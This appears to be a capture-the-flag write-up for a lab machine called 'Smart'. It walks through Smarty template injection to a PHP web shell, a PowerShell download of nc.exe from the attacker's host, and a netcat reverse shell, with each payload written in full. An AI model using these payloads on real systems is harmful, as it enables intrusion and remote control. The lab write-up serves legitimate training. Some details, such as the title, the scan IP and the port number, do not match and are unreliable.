# BountyHunter

# Enumeration
---
### Nmap
#

TCP scan of all ports, including default scripts.

```bash
# Command
nmap -v -sS -sV -sC -T4 -p- -oA bountyhunter-full-tcp 10.129.95.166

# Results
# Nmap 7.94SVN scan initiated Fri Jan 10 05:28:31 2025 as: nmap -v -sS -sV -sC -T4 -p- -oA smart-htb-tcp-full 10.129.228.130
Nmap scan report for 10.129.228.130
Host is up (0.026s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.3)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.3
|_http-title: Smart | Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
# HTTP (Port 80)

Browsing to port 980 displays a registration page for a site called "Smart Technologies". From here it is possible to create an account and login. 

Once logged in thesite itself has very little functionality, in fact one of the only things you can do is edit your profile information, so this is where I put my focus. I noticed there is a standard 'Success' message when updating everything except the email address, where you're given feedback about a notification being created.

![image](https://github.com/user-attachments/assets/bb4d9eb7-2340-4e08-918e-2b2de757e482)

At the top of the page there is a notifcation button which shows a notification regarding the updated email address, the message appears to be templated with the email adress entered so naturally my focus goes to a potential Template Injection.

```text
# Notification Text
We have seen that your email has recently changed to 1. If this is not intended please contact admin@smart.htb
```

Using the basic template injection string '{5*5}' I am able to confirm template injection is present, the new text in the notification returns 25. I am not injecting into the notification template via the email update functionality. 

A good way to determine which template engine you're dealing with it to follow the following guide:

![image](https://github.com/user-attachments/assets/bafb5775-844e-428c-bd5e-6a48a840486d)

By following these steps I could determine I'm injecting into the Smarty Template Engine (hence the name of the box).

If there was any doubt, the following error confirmed Smarty is used:
![image](https://github.com/user-attachments/assets/dc46e9bb-2db8-4389-9174-f9152febfe9a)

Using the Smarty Docs for interesting function I discover {php}{/php}. These tags allow us to inject php inbetween, this should make getting a web shell trivial, and it was. 

I injected the following payload:

```bash
{php} file_put_contents("c:\\xampp\\htdocs\\s.php",'<?php echo exec($_GET["0"]);?>');
{/php}
```

And called it using:

```text
curl http://smart.htb/s.php?0=dir
```

This returns the current directory as the OS is Windows, We have successfully created a web shell. 

To create a reverse shell I wanted to move nc.exe over to the target, remembering to move the Windows executable and not the standard Linux nc I'm used to dealing with! I use Powershell wget for this. With a web server set up hosting nc.exe on my attack machine the following payload is sent to the web shell to retrirve the exe. 

```bash
http://smart.htb/s.php?0=powershell%20wget%20http://10.10.14.5:8081/nc.exe%20-outfile%20nc.exe
```

A hit on my webshell shows the file was retrieved:

```bash
┌──(kali㉿kali)-[~/…/HTB/boxes/smart/web-server]
└─$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.228.130 - - [10/Jan/2025 09:04:01] "GET /nc.exe HTTP/1.1" 200 -
```

The payload used to connect back to my listener on my target:

```bash
http://smart.htb/s.php?0=nc.exe%2010.10.14.5%2080%20-e%20cmd.exe
```

Below is the caught reverse shell from the Windows target:

![image](https://github.com/user-attachments/assets/07e1fc42-f198-42e3-b81f-bc065ea648fa)

From here I can browse the file system and get the user flag.

![image](https://github.com/user-attachments/assets/42aca482-360b-4613-9083-451e3b6f62be)

This machine was done during prep for the OSWA exam, and therefore I didn't continue with the Priv Esc which is outside the scope of the course, I will finish this box at a future time. 
